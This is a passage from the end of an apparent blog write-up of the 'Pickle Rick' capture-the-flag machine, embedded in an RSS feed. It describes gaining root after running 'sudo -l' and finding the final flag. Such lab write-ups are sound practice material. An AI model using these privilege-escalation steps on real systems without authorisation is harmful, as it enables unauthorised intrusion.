&lt;strong&gt;sudo -l&lt;/strong&gt; and yep we had it all in front of our eyes&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-18.03.26.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-18.03.47.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and that's it you are root and you have the third file that contains the last flag for the machine and everything is done the headaches are gone, but to be honest, it is a very cute challenge not hard at all, little bit of twists, but that's the beauty of it you better get used to it.&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;</content:encoded></item></channel></rss>